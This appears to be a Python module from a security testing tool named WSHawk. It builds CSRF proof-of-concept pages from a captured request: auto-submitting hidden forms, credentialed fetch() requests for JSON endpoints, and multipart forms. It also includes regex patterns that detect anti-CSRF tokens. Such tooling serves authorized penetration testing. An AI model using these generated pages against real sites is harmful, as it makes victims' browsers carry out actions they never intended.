"""
WSHawk CSRF Forge Engine
Generates proof-of-concept HTML forms that reproduce a target HTTP request,
demonstrating Cross-Site Request Forgery vulnerabilities.
"""

import re
import html
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, Any, List, Optional


class WSHawkCSRFForge:
    """
    Generates CSRF exploit proof-of-concept HTML pages.

    Takes a captured HTTP request (method, URL, headers, body) and produces
    a self-submitting HTML form or XHR-based exploit that reproduces
    the request from a victim's browser.

    Features:
        - Auto-submitting HTML form generation
        - XHR/Fetch-based PoC for JSON endpoints
        - Multipart form support
        - Anti-CSRF token detection and warnings
        - CORS preflight analysis
    """

    # Patterns indicating CSRF protection is present
    CSRF_TOKEN_PATTERNS = [
        r"csrf[_-]?token",
        r"authenticity[_-]?token",
        r"__RequestVerificationToken",
        r"_token",
        r"csrfmiddlewaretoken",
        r"XSRF-TOKEN",
        r"X-CSRF-TOKEN",
        r"anti[_-]?forgery",
        r"__VIEWSTATE",
        r"nonce",
    ]

    async def generate(
        self,
        method: str,
        url: str,
        headers: str = "",
        body: str = "",
        content_type: str = "",
    ) -> Dict[str, Any]:
        """
        Generate a CSRF PoC for the given request.

        Args:
            method: HTTP method (GET, POST, PUT, DELETE).
            url: Target URL.
            headers: Raw headers string (Header: Value per line).
            body: Request body (form data or JSON).
            content_type: Content-Type of the request.

        Returns:
            Dict with 'poc_html', 'poc_type', 'warnings', and 'csrf_tokens_found'.
        """
        if not url or not url.strip():
            raise ValueError("URL is required")

        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        method = method.upper().strip() if method else "GET"
        warnings: List[str] = []
        csrf_tokens: List[str] = []

        # Parse headers
        parsed_headers = self._parse_headers(headers)

        # Detect content type
        if not content_type:
            content_type = parsed_headers.get("content-type", "")

        # Check for CSRF protections
        csrf_tokens = self._detect_csrf_tokens(url, parsed_headers, body)
        if csrf_tokens:
            warnings.append(
                f"CSRF token(s) detected: {', '.join(csrf_tokens)}. "
                "PoC may not work without a valid token."
            )

        # Check SameSite cookies
        cookie_header = parsed_headers.get("cookie", "")
        if cookie_header:
            warnings.append(
                "Request includes cookies. SameSite=Lax/Strict cookies "
                "won't be sent cross-origin."
            )

        # Generate appropriate PoC
        if "application/json" in content_type.lower():
            poc_html = self._generate_fetch_poc(method, url, body, parsed_headers)
            poc_type = "Fetch/XHR"
            warnings.append(
                "JSON endpoint — requires CORS misconfiguration to work cross-origin."
            )
        elif "multipart/form-data" in content_type.lower():
            poc_html = self._generate_multipart_poc(method, url, body)
            poc_type = "Multipart Form"
        else:
            poc_html = self._generate_form_poc(method, url, body)
            poc_type = "Auto-Submit Form"

        return {
            "poc_html": poc_html,
            "poc_type": poc_type,
            "method": method,
            "url": url,
            "warnings": warnings,
            "csrf_tokens_found": csrf_tokens,
            "exploitable": len(csrf_tokens) == 0,
        }

    def _parse_headers(self, headers_str: str) -> Dict[str, str]:
        """Parse raw header string into a dict."""
        result: Dict[str, str] = {}
        if not headers_str:
            return result
        for line in headers_str.strip().splitlines():
            if ":" in line:
                key, val = line.split(":", 1)
                result[key.strip().lower()] = val.strip()
        return result

    def _detect_csrf_tokens(
        self, url: str, headers: Dict[str, str], body: str
    ) -> List[str]:
        """Scan request for CSRF token indicators."""
        found: List[str] = []
        search_text = url + " " + " ".join(headers.values()) + " " + body

        for pattern in self.CSRF_TOKEN_PATTERNS:
            if re.search(pattern, search_text, re.IGNORECASE):
                found.append(pattern.replace(r"[_-]?", ""))

        return list(set(found))

    def _generate_form_poc(self, method: str, url: str, body: str) -> str:
        """Generate an auto-submitting HTML form PoC."""
        parsed = urlparse(url)
        action_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Parse form fields from body (key=value&key2=value2)
        fields = []
        if body:
            pairs = body.split("&")
            for pair in pairs:
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    fields.append((k, v))

        # Also include query params for GET
        if parsed.query:
            qp = parse_qs(parsed.query, keep_blank_values=True)
            for k, vals in qp.items():
                for v in vals:
                    fields.append((k, v))

        # Build hidden inputs
        inputs_html = ""
        for name, value in fields:
            safe_name = html.escape(name)
            safe_value = html.escape(value)
            inputs_html += f'    <input type="hidden" name="{safe_name}" value="{safe_value}" />\n'

        use_method = method if method in ("GET", "POST") else "POST"

        return f"""<!DOCTYPE html>
<html>
<head>
    <title>WSHawk CSRF PoC</title>
    <style>
        body {{ font-family: monospace; background: #0a0a0f; color: #e0e0e0; padding: 40px; }}
        .info {{ background: #1a1a2e; padding: 16px; border-radius: 8px; margin: 12px 0; border-left: 3px solid #06b6d4; }}
        h1 {{ color: #06b6d4; }}
        code {{ background: #111; padding: 2px 6px; border-radius: 4px; }}
    </style>
</head>
<body>
    <h1>⚡ WSHawk CSRF Proof of Concept</h1>
    <div class="info">
        <strong>Target:</strong> <code>{html.escape(url)}</code><br>
        <strong>Method:</strong> <code>{use_method}</code><br>
        <strong>Auto-submit:</strong> Yes (fires on page load)
    </div>
    <form id="csrf-form" action="{html.escape(action_url)}" method="{use_method}">
{inputs_html}        <input type="submit" value="Submit (Auto)" />
    </form>
    <script>
        // Auto-submit after 1 second
        setTimeout(function() {{
            document.getElementById('csrf-form').submit();
        }}, 1000);
    </script>
</body>
</html>"""

    def _generate_fetch_poc(
        self, method: str, url: str, body: str, headers: Dict[str, str]
    ) -> str:
        """Generate a Fetch API-based PoC for JSON endpoints."""
        # Filter out host/content-length/connection headers
        skip = {"host", "content-length", "connection", "accept-encoding"}
        custom_headers = {
            k: v for k, v in headers.items() if k.lower() not in skip
        }

        headers_js = "{\n"
        for k, v in custom_headers.items():
            headers_js += f'            "{k}": "{v}",\n'
        headers_js += "        }"

        escaped_body = body.replace("\\", "\\\\").replace("`", "\\`")

        return f"""<!DOCTYPE html>
<html>
<head>
    <title>WSHawk CSRF PoC (Fetch)</title>
    <style>
        body {{ font-family: monospace; background: #0a0a0f; color: #e0e0e0; padding: 40px; }}
        .info {{ background: #1a1a2e; padding: 16px; border-radius: 8px; margin: 12px 0; border-left: 3px solid #f59e0b; }}
        h1 {{ color: #f59e0b; }}
        code {{ background: #111; padding: 2px 6px; border-radius: 4px; }}
        pre {{ background: #111; padding: 12px; border-radius: 6px; overflow-x: auto; }}
        #result {{ margin-top: 16px; padding: 12px; background: #0f1a0f; border-radius: 6px; }}
    </style>
</head>
<body>
    <h1>⚡ WSHawk CSRF PoC (Fetch API)</h1>
    <div class="info">
        <strong>Target:</strong> <code>{html.escape(url)}</code><br>
        <strong>Method:</strong> <code>{method}</code><br>
        <strong>Type:</strong> JSON/XHR — requires CORS misconfiguration
    </div>
    <div id="result">Waiting...</div>
    <script>
        fetch("{html.escape(url)}", {{
            method: "{method}",
            credentials: "include",
            headers: {headers_js},
            body: `{escaped_body}`
        }})
        .then(r => r.text())
        .then(t => {{
            document.getElementById('result').innerHTML =
                '<strong style="color:#22c55e;">✓ Request sent!</strong><pre>' + t.substring(0, 500) + '</pre>';
        }})
        .catch(e => {{
            document.getElementById('result').innerHTML =
                '<strong style="color:#ef4444;">✗ Blocked:</strong> ' + e.message;
        }});
    </script>
</body>
</html>"""

    def _generate_multipart_poc(self, method: str, url: str, body: str) -> str:
        """Generate a multipart form PoC."""
        # For multipart, we create a form with enctype
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>WSHawk CSRF PoC (Multipart)</title>
    <style>
        body {{ font-family: monospace; background: #0a0a0f; color: #e0e0e0; padding: 40px; }}
        h1 {{ color: #06b6d4; }}
    </style>
</head>
<body>
    <h1>⚡ WSHawk CSRF PoC (Multipart)</h1>
    <form id="csrf-form" action="{html.escape(url)}" method="POST" enctype="multipart/form-data">
        <textarea name="data" style="display:none;">{html.escape(body)}</textarea>
        <input type="submit" value="Submit" />
    </form>
    <script>
        setTimeout(function() {{
            document.getElementById('csrf-form').submit();
        }}, 1000);
    </script>
</body>
</html>"""
